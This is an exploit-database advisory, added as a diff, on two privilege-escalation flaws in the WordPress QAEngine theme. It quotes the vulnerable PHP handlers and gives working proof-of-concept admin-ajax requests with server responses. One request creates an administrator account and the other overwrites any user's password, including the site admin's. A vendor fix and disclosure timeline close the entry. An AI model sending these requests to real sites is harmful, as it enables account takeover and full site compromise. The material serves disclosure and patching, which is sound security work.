@@ -1,0 +1,105 @@
+id: 23521
+date: 04/10/2015
+title: WordPress QAEngine Theme Privilege Escalation Vulnerability
+author: Evex
+cves: 
+
+------------------------------------------------------------------------------
+WordPress QAEngine Theme Privilege Escalation
+------------------------------------------------------------------------------
+
+[-] Theme Link:
+
+https://www.enginethemes.com/themes/qaengine/
+
+[-] Vulnerability Description:
+
+[+] 1st Vulnerability:
+
+qaengine vulnerability allows an attacker to have an administrator account on the target's website
+vuln code in /qaengine/includes/aecore/class-ae-users.php:
+
+public function insert( $user_data ){
+        if( !$user_data['user_login'] || !preg_match('/^[a-z\d_]{2,20}$/i', $user_data['user_login']) ) {
+            return new WP_Error( 'username_invalid', __("Username only lowercase letters (a-z) and numbers are allowed.", ET_DOMAIN) );
+        }
+        /**
+         * insert user by wp_insert_user
+        */
+        $result = wp_insert_user( $user_data ); ....
+
+its inserting a new user using user input ( $user_data )
+the function is being accessed from the sync function
+
+public function sync($request) {
+    extract( $request );
+    unset($request['method']);
+    switch ( $method ) {
+        case 'create':
+            $result    =    $this->insert( $request );
+            break;
+        case 'update':
+            $result    =    $this->update( $request );
+            break;
+        case 'remove':
+            $result    =    $this->delete( $request['ID'] );
+            break;
+        case 'read':
+            $result    =    $this->get( $request['ID'] );
+            break;
+        default :
+            return new WP_Error('invalid_method', __("Invalid method", ET_DOMAIN) );
+    }
+    return $result;
+}
+
+and the sync function can be accessed through ajax
+$this->add_ajax('ae-sync-user', 'sync');
+
+and since there is no third parameter in add_ajax setting 'nopriv' to true this can be accessed only by registered users
+
+public function add_ajax($hook, $callback, $priv = true, $no_priv = true, $priority = 10, $accepted_args = 1 ){
+        if ( $priv )
+            $this->add_action( self::AJAX_PREFIX . $hook, $callback, $priority, $accepted_args );
+        if ( $no_priv )
+            $this->add_action( self::AJAX_NOPRIV_PREFIX . $hook, $callback, $priority, $accepted_args );
+    }
+	
+Proof of Concept:
+
+accessing this by a registered user will insert a new user with username (xADMIN) and password (xPASS) and an administrator role
+
+localhost/wp/wp-admin/admin-ajax.php?action=ae-sync-user&method=create&user_login=xADMIN&user_pass=xPASS&role=administrator
+
+response:
+
+{"success":true,"data":{"action":"ae-sync-user","user_login":"xADMIN","user_pass":"xPASS","role":"administrator","ID":5},"msg":"Update user successful!"}
+
+[+] 2nd Vunerability:
+
+and another vulnerability in update function
+public function update( $user_data ){
+....
+$result = wp_update_user( $user_data );
+...
+}
+
+this will allow the attacker to update any user(including administrator) information like password,email,etc...
+
+Proof of Concept:
+
+the id parameter is the id of the user to be modified (usually 1 will be the administrator)
+localhost/wp/wp-admin/admin-ajax.php?action=ae-sync-user&method=update&ID=1&user_pass=ANOTHERPASSWORD
+
+Response:
+
+{"success":true,"data":{"ID":"1","user_login":"admin","user_nicename":"admin","user_email": ...
+
+
+[-] Timeline:
+
+22 March - Vendor Notified
+23 March - Vendor Replied & Fix Released
+07 April - Public Disclosure
+
+#  0day.today [2023-03-21]  #
